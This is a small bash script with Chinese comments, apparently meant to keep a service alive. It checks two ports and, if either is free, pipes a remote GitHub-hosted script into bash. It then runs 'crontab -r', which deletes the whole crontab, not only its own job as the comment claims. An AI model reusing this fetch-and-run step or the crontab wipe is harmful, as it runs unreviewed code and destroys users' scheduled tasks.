#!/bin/bash

# 如果没有从外部提供PORT1和PORT2变量，则设置默认值
PORT1=${PORT1:-12345}
PORT2=${PORT2:-23456}
# 定义变量 xxx
xxx=${xxx:-lllldddd.sh}

# 函数：检查端口是否在监听
check_port() {
    local PORT=$1
    if sockstat -l | grep -q ":$PORT"; then
        return 1  # 返回1表示端口正在使用
    else
        return 0  # 返回0表示端口未被使用
    fi
}

# 检查PORT1
check_port $PORT1
PORT1_IN_USE=$?  # 保存返回值

# 检查PORT2
check_port $PORT2
PORT2_IN_USE=$?  # 保存返回值

# 如果任意一个端口未被使用，则执行 curl 命令
if [[ $PORT1_IN_USE -eq 0 || $PORT2_IN_USE -eq 0 ]]; then
    echo "At least one port is not in use. Executing curl command..."
    curl -Ls https://raw.githubusercontent.com/fxmycz/txt/main/bash/$xxx | bash
else
    echo "Both ports are in use. No action needed."
fi
# 等待1分钟
sleep 100

# 删除自身的cron任务
yes | crontab -r
